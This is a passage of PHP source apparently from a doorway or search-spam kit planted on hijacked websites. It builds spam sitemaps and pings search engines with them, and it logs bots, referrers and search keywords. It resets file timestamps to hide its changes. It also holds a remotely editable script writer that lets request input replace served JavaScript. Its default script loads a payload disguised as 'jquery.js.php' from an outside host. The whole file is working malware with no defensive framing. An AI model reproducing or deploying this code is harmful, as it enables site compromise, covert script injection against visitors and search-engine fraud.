	global $sitemapName, $keys_file, $root, $id;
	global $root_dir, $addr, $door_dir, $link, $param;
	
	$maxCount = 30000;
	
	if(is_inc())
	{
		if(!empty($id))
			$addr2 = substr($addr, 0, strpos($addr, '?')) . '?' . $param . '=' . $id;
		else
			$addr2 = substr($addr, 0, strpos($addr, '?'));
	}
	else
	{
		$addr2 = substr($addr, 0, strpos($addr, '?'));
	}
	$time  = filemtime(__FILE__);
	$dir   = isset($_GET['root'])?$root_dir:$root_dir . $door_dir;
	$url   = isset($_GET['root'])?$link . '/':$root;
	$url = delDubSlash($url);
	
	if(check_file($dir . $sitemapName))
	{
		echo "<a target=_blanc href='{$url}{$sitemapName}'>SiteMap</a>";
		exit;
	}

	$lines = file($root_dir . $keys_file);

	if(count($lines) < $maxCount)
	{
		array_unshift($lines, $addr2); 
		file_put_contents($dir . $sitemapName, genSitemapText($lines));
		echo "<a target=_blanc href='$url$sitemapName'>SiteMap</a>";
		@touch($dir . $sitemapName, $time, $time);
		exit;
	}
	else
	{
		echo "<a target=_blanc href='$url$sitemapName'>SiteMap</a><br />";
		for($i=1;$i < ceil(count($lines) / $maxCount) + 1; $i++)
		{
			$tmpName  = pathinfo($sitemapName, PATHINFO_FILENAME) . $i . '.' . pathinfo($sitemapName, PATHINFO_EXTENSION);
			$lines2[] = $url . $tmpName;
			file_put_contents($dir . $tmpName, genSitemapText(array_slice($lines, $maxCount * ($i - 1), $maxCount)));
			
			echo "<a target=_blanc href='$url$tmpName'>SiteMap$i</a><br />";
			@touch($dir . $tmpName, $time, $time);
		}
		$lines2[] = $addr2;
		$lines2[] = $url . $sitemapName;
		file_put_contents($dir . $sitemapName, genSitemapText($lines2));
		@touch($dir . $sitemapName, $time, $time);
	}
	exit;
}

function genSitemapText($lines)
{
	global $addr, $sep;
	if(!is_array($lines)) wError('Where array?');
	
	$text = '';
	$text .= "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
	<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">";
	
	foreach ($lines as $line) 
	{
		if(empty($line)) continue;
		$loc = ($line{0} == 'h' AND $line{1} == 't')?$line:$addr . urlencode(str_replace(' ', $sep, trim($line)));
		$text .= "
		<url>
		   <loc>$loc</loc>
		   <changefreq>weekly</changefreq>
		   <priority>1.0</priority>
		</url>\n";
	}

	$text .= '</urlset>';
	return $text;
}

function getSingleReplaceCombination($replace, $with, $inHaystack) {
    $splits = explode($replace, $inHaystack);
    $result = array();
    for ($i = 1, $ix = count($splits); $i < $ix; ++$i) {
        $previous = array_slice($splits, 0, $i);
        $next     = array_slice($splits, $i);
 
        $combine  = array_pop($previous) . $with . array_shift($next);
        $result[] = implode($replace, array_merge($previous, array($combine), $next));
        break; //remove this, for multiple replaces
    }
    return implode("",$result);
}

function putBots()
{
	global $bot_file, $cacheFolder, $root_dir;
	
	$time = filemtime(__FILE__);
	if(!is_file($root_dir . $bot_file)) file_put_contents($root_dir . $bot_file, '');
	
	$ua = $_SERVER['HTTP_USER_AGENT'];
	@touch($root_dir . $bot_file, $time, $time);
	@touch($root_dir . $cacheFolder, $time, $time);
	
	if(!stristr($ua, 'bot')) return;
	
	$bots = unserialize(file_get_contents($root_dir . $bot_file));

	if(is_bool($bots)) $bots = array();
	if(count($bots) == 0) $bots[$ua] = 1;
	elseif(isset($bots[$ua])) $bots[$ua] += 1;
	else $bots[$ua] = 1;

	file_put_contents($root_dir . $bot_file, serialize($bots));
	@touch($root_dir . $bot_file, $time, $time);
	@touch($root_dir . $cacheFolder, $time, $time);
	return;
}

function getBots()
{
	global $bot_file, $root_dir;
	if(!check_file($root_dir . $bot_file)) die('No logs!');
	
	$bots = unserialize(file_get_contents($root_dir . $bot_file));
	$bots2 = "<table style='border: 1px solid #000;border-collapse: collapse;'>
	<tr>\n		<th>ua</th>\n		<th>once</th>\n	</tr>\n";
	
	arsort($bots);
	
	$count = 0;
	foreach($bots as $key => $value)
	{
		$bots2 .= "	<tr>\n		<td style=\"border: 1px solid #000;\">$key</td>
		<td style=\"border: 1px solid #000;\">$value</td>\n	</tr>\n";
		$count += $value;
	}
	$bots2 .= "	<tr>\n		<td></td>
		<td style=\"border: 1px solid #000;\">$count</td>\n	</tr>\n";
	
	$bots2 .= "</table>";
	
	echo $bots2;
	exit;
}

function putRefs()
{
	global $ref_file, $cacheFolder, $root_dir;
	
	$time = filemtime(__FILE__);
	if(!is_file($root_dir . $ref_file)) file_put_contents($root_dir . $ref_file, '');
	
	$ref = !empty($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'';
	@touch($root_dir . $ref_file, $time, $time);
	@touch($root_dir . $cacheFolder, $time, $time);
	
	if(empty($ref)) return;
	
	$ref = parse_url($ref, PHP_URL_HOST);	
	
	$fp = fopen($root_dir . $ref_file, "a+");

	if (flock($fp, LOCK_EX)) 
	{
		$refs = unserialize(fread($fp, filesize($root_dir . $key_file)));
		
		if(is_bool($refs)) $refs = array();
		if(count($refs) == 0) $refs[$ref] = 1;
		elseif(isset($refs[$ref])) $refs[$ref] += 1;
		else $refs[$ref] = 1;

		ftruncate($fp, 0);
		fwrite($fp, serialize($refs));
		fflush($fp);
		flock($fp, LOCK_UN);
		
		@touch($root_dir . $ref_file, $time, $time);
		@touch($root_dir . $cacheFolder, $time, $time);
		
		fclose($fp);
		return;
	} 
	else 
	{
		fclose($fp);
		return;
	}
	
	
}

function putKeys()
{
	global $key_file, $cacheFolder;
	global $key, $root_dir;
	
	$arrRef = array('google', 'yahoo', 'yandex', 'mail', 'meta', 'bigmir', 'msn', 'bing', 'baidu', 'aol', 'ask', 'altavista', 'search');
	
	$time = filemtime(__FILE__);
	@touch($root_dir . $key_file, $time, $time);
	@touch($root_dir . $cacheFolder, $time, $time);
	
	if(empty($key)) return;
	
	$ua = $_SERVER['HTTP_USER_AGENT'];
	$ref = !empty($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'';
	if(stristr($ua, 'bot')) $type = 'bot';
	elseif(preg_match("/(".implode('|', $arrRef).")/is", $ref)) $type = 'ref';
	else $type = 'oth';
	
	$fp = fopen($root_dir . $key_file, "a+");

	if (flock($fp, LOCK_EX)) 
	{
		$keys = unserialize(fread($fp, filesize($root_dir . $key_file)));
		
		if(is_bool($keys)) $keys = array();
		
		if(count($keys) == 0)
		{
			$keys[$key]['bot'] = 0;
			$keys[$key]['ref'] = 0;
			$keys[$key]['oth'] = 0;
			$keys[$key]['all'] = 1;
			$keys[$key][$type] = 1;
		}
		elseif(isset($keys[$key]))
		{
			$keys[$key][$type] += 1;
			$keys[$key]['all'] += 1;
		}
		else
		{
			$keys[$key]['bot'] = 0;
			$keys[$key]['ref'] = 0;
			$keys[$key]['oth'] = 0;
			$keys[$key]['all'] = 1;
			$keys[$key][$type] = 1;
		}

		ftruncate($fp, 0);
		fwrite($fp, serialize($keys));
		fflush($fp);
		flock($fp, LOCK_UN);
		
		@touch($root_dir . $key_file, $time, $time);
		@touch($root_dir . $cacheFolder, $time, $time);
		
		fclose($fp);
		return;
	} 
	else 
	{
		fclose($fp);
		return;
	}
}

function editScript()
{
	global $src_file, $root_dir, $urlJS, $urlJS2;
	$src = '
	var dwn="%URL%";
	var link="%URL2%";
document.write("<script language=\'javascript\' rel=\'nofollow\' type=\'text/javascript\' src=\'" + link + "jquery.js.php?v=2&i=" + encodeURIComponent(base64encode(dwn+key)) + "\'><\/sc" + "ript>");

function base64encode(str) {
    var b64chars = \'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg\'+ 
                   \'hijklmnopqrstuvwxyz0123456789+/=\'; 
    var b64encoded = \'\'; 
    var chr1, chr2, chr3; 
    var enc1, enc2, enc3, enc4; 
  
    for (var i=0; i<str.length;) { 
        chr1 = str.charCodeAt(i++); 
        chr2 = str.charCodeAt(i++); 
        chr3 = str.charCodeAt(i++); 
  
        enc1 = chr1 >> 2; 
        enc2 = ((chr1 & 3) << 4) | (chr2 >> 4); 
  
        enc3 = isNaN(chr2) ? 64:(((chr2 & 15) << 2) | (chr3 >> 6)); 
        enc4 = isNaN(chr3) ? 64:(chr3 & 63); 
  
        b64encoded += b64chars.charAt(enc1) + b64chars.charAt(enc2) + 
                      b64chars.charAt(enc3) + b64chars.charAt(enc4); 
    } 
    return b64encoded; 
} 
';
	
	$src = isset($_REQUEST['src'])?base64_decode($_REQUEST['src']):$src;
	$url = isset($_REQUEST['url'])?$_REQUEST['url']:$urlJS;
	$url2 = isset($_REQUEST['url2'])?$_REQUEST['url2']:$urlJS2;

	$js = str_replace(array('%URL%', '%URL2%'), array($url, $url2), $src);
	
	if(file_put_contents($root_dir . $src_file, $js))
		echo 'OK';
	else
		echo 'NOT OK';
	
	exit;
}

function genScript($url = '', $url2 = '')
{
	$src = '
	var dwn="%URL%";
	var link="%URL2%";
document.write("<script language=\'javascript\' rel=\'nofollow\' type=\'text/javascript\' src=\'" + link + "jquery.js.php?v=2&i=" + encodeURIComponent(base64encode(dwn+key)) + "\'><\/sc" + "ript>");

function base64encode(str) {
    var b64chars = \'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg\'+ 
                   \'hijklmnopqrstuvwxyz0123456789+/=\'; 
    var b64encoded = \'\'; 
    var chr1, chr2, chr3; 
    var enc1, enc2, enc3, enc4; 
  
    for (var i=0; i<str.length;) { 
        chr1 = str.charCodeAt(i++); 
        chr2 = str.charCodeAt(i++); 
        chr3 = str.charCodeAt(i++); 
  
        enc1 = chr1 >> 2; 
        enc2 = ((chr1 & 3) << 4) | (chr2 >> 4); 
  
        enc3 = isNaN(chr2) ? 64:(((chr2 & 15) << 2) | (chr3 >> 6)); 
        enc4 = isNaN(chr3) ? 64:(chr3 & 63); 
  
        b64encoded += b64chars.charAt(enc1) + b64chars.charAt(enc2) + 
                      b64chars.charAt(enc3) + b64chars.charAt(enc4); 
    } 
    return b64encoded; 
} 
';
	return str_replace(array('%URL%', '%URL2%'), array($url, $url2), $src);
}

function getScript()
{
	global $src_file, $urlJS, $urlJS2, $root_dir;
	
	if(is_file($root_dir . $src_file))
	{
		echo file_get_contents($root_dir . $src_file);
	}
	else
	{
		$src = genScript($urlJS, $urlJS2);
		file_put_contents($root_dir . $src_file, $src);
		echo $src;
	}
	
	exit;
}

function sendSitemap()
{
	global $sitemapName, $root, $link;
	$smn   = isset($_GET['root'])?$link . '/' . $sitemapName:$root . $sitemapName;
	$smn = delDubSlash($smn);
	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/webmasters/sitemaps/ping?sitemap=' . $smn);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');
	$outch = curl_exec($ch);
	curl_close($ch);

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'http://www.bing.com/webmaster/ping.aspx?sitemap=' . $smn);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');
	$outch = curl_exec($ch);
	curl_close($ch);
	
	echo 'OK';
	exit;
}

function getrefs()
{
	global $ref_file, $root_dir;
	if(!check_file($root_dir . $ref_file)) die('No logs!');
	
	$refs = unserialize(file_get_contents($root_dir . $ref_file));
	$refs2 = "<table style='border: 1px solid #000;border-collapse: collapse;'>
	<tr>\n		<th>ref</th>\n		<th>once</th>\n	</tr>\n";
	
	arsort($refs);
	
	$refsN = array();
	if(!isset($_GET['full']))
	{
		foreach($refs as $key => $value)
		{
			$key = str_ireplace('www.', '', pathinfo($key, PATHINFO_FILENAME));
			@$refsN[$key]+=$value;
		}
	}
	else
	{
		$refsN = $refs;
	}
	
	arsort($refsN);
	
	$count = 0;
	foreach($refsN as $key => $value)
	{
		$refs2 .= "	<tr>\n		<td style=\"border: 1px solid #000;\">$key</td>
		<td style=\"border: 1px solid #000;\">$value</td>\n	</tr>\n";
		$count += $value;
	}
	$refs2 .= "	<tr>\n		<td></td>
		<td style=\"border: 1px solid #000;\">$count</td>\n	</tr>\n";
	
	$refs2 .= "</table>";
	
	echo $refs2;
	exit;
}



function arrayBetween(array $arr, $count, $page)
{
	$start = $page * $count - $count; 
	$arr = array_slice($arr, $start, $count);
	
	return $arr;
}

function getKeys()
{
	global $key_file, $root_dir;
	if(!check_file($root_dir . $key_file)) die('No keys!');
	
	$page  = isset($_GET['p'])?$_GET['p']:1;
	$count = isset($_GET['c'])?$_GET['c']:50;
	
	$keys = unserialize(file_get_contents($root_dir . $key_file));
	
	$total = intval((count($keys) - 1) / $count) + 1;  
	if($page > $total) $page = $total;	
	
	$keysBT = arrayBetween($keys, $count, $page);
	
	$keys2 = '';
	$_GET['p'] = ($page == 1)?1:$page - 1;
	$prev = ($page == 1)?'Prev ':"<a href='?" . http_build_query($_GET) . "'>Prev</a> ";
	$keys2 .= $prev;
	$_GET['p'] = ($page == $total)?$total:$page + 1;
	$next = ($page == $total)?'Next<br /><br />':"<a href='?" . http_build_query($_GET) . "'>Next</a><br /><br />";
	$keys2 .= $next;
	
	$keys2 .= "<table style='border: 1px solid #000;border-collapse: collapse;'>
	<tr>\n		<th>key</th>\n		<th>bot</th>\n		<th>ref</th>\n		<th>oth</th>\n		<th>all</th>\n	</tr>\n";
	
	uasort($keysBT, 'uas');

	$countBot = 0;
	$countRef = 0;
	$countOth = 0;
	$countAll = 0;
	
	foreach($keysBT as $key => $value)
	{
		$keys2 .= "	<tr>\n		<td style=\"border: 1px solid #000;\">$key</td>
	<td style=\"border: 1px solid #000;\">{$value['bot']}</td>\n	
	<td style=\"border: 1px solid #000;\">{$value['ref']}</td>\n	
	<td style=\"border: 1px solid #000;\">{$value['oth']}</td>\n	
	<td style=\"border: 1px solid #000;\">{$value['all']}</td>\n	
	</tr>\n";
		$countBot += $value['bot'];
		$countRef += $value['ref'];
		$countOth += $value['oth'];
		$countAll += $value['all'];
	}
	$keys2 .= "	<tr>\n		<td style=\"border: 1px solid #000;\">&nbsp;</td>
		<td style=\"border: 1px solid #000;\">&nbsp;</td>\n	
		<td style=\"border: 1px solid #000;\">&nbsp;</td>\n	
		<td style=\"border: 1px solid #000;\">&nbsp;</td>\n	
		<td style=\"border: 1px solid #000;\">&nbsp;</td>\n	
		</tr>\n";
	$keys2 .= "	<tr>\n		<td style=\"border: 1px solid #000;\">ALL</td>
		<td style=\"border: 1px solid #000;\">$countBot</td>\n	
		<td style=\"border: 1px solid #000;\">$countRef</td>\n	
		<td style=\"border: 1px solid #000;\">$countOth</td>\n	
		<td style=\"border: 1px solid #000;\">$countAll</td>\n	
		</tr>\n";
	$keys2 .= "	<tr>\n		<td style=\"border: 1px solid #000;\">ALLALL</td>
		<td style=\"border: 1px solid #000;\">" . array_sum(array_column($keys,'bot')) . "</td>\n	
		<td style=\"border: 1px solid #000;\">" . array_sum(array_column($keys,'ref')) . "</td>\n	
		<td style=\"border: 1px solid #000;\">" . array_sum(array_column($keys,'oth')) . "</td>\n	
		<td style=\"border: 1px solid #000;\">" . array_sum(array_column($keys,'all')) . "</td>\n	
		</tr>\n";
	
	$keys2 .= "</table>";
	
	$keys2 .= '<br />' . $prev;
	$keys2 .= $next;
	
	echo $keys2;
	exit;
}

function uas($a, $b)
{
	$a = $a['all'];
	$b = $b['all'];
	if ($a == $b) 
	{
		return 0;
	}
	return ($a > $b) ? -1 : 1;
}

function curl_redir_exec($ch){
	static $curl_loops = 0;  
	static $curl_max_loops = 20;  
	if ($curl_loops >= $curl_max_loops)  
	{  
		$curl_loops = 0;  
		return FALSE;  
	}  
	curl_setopt($ch, CURLOPT_HEADER, true);  
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  
	$data = curl_exec($ch);  
	list($header, $data) = explode("\r\n\r\n", $data, 2);  
	$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);  
	if ($http_code == 301 || $http_code == 302){  
		$matches = array();  
		preg_match('/Location:(.*?)\n/', $header, $matches);  
		$url = @parse_url(trim(array_pop($matches)));  
		if (!$url){
			$curl_loops = 0;  
			return $data;  
		}
		$last_url = parse_url(curl_getinfo($ch, CURLINFO_EFFECTIVE_URL));  
		if (!$url['scheme'])  
			$url['scheme'] = $last_url['scheme'];  
		if (!$url['host'])  
			$url['host'] = $last_url['host'];  
		if (!$url['path'])  
			$url['path'] = $last_url['path'];  
		$new_url = $url['scheme'] . '://' . $url['host'] . $url['path'] . ($url['query']?'?'.$url['query']:'');  
		curl_setopt($ch, CURLOPT_URL, $new_url);
		return curl_redir_exec($ch);  
	}else{  
		$curl_loops=0;  
		return $data;  
	}
}

function noFuncEx()
{
	if (!function_exists('array_column')) {
    function array_column($input, $column_key, $index_key = null) {
        $arr = array_map(function($d) use ($column_key, $index_key) {
            if (!isset($d[$column_key])) {
                return null;
            }
            if ($index_key !== null) {
                return array($d[$index_key] => $d[$column_key]);
            }
            return $d[$column_key];
        }, $input);

        if ($index_key !== null) {
            $tmp = array();
            foreach ($arr as $ar) {
                $tmp[key($ar)] = current($ar);
            }
            $arr = $tmp;
        }
        return $arr;
    }
	}
}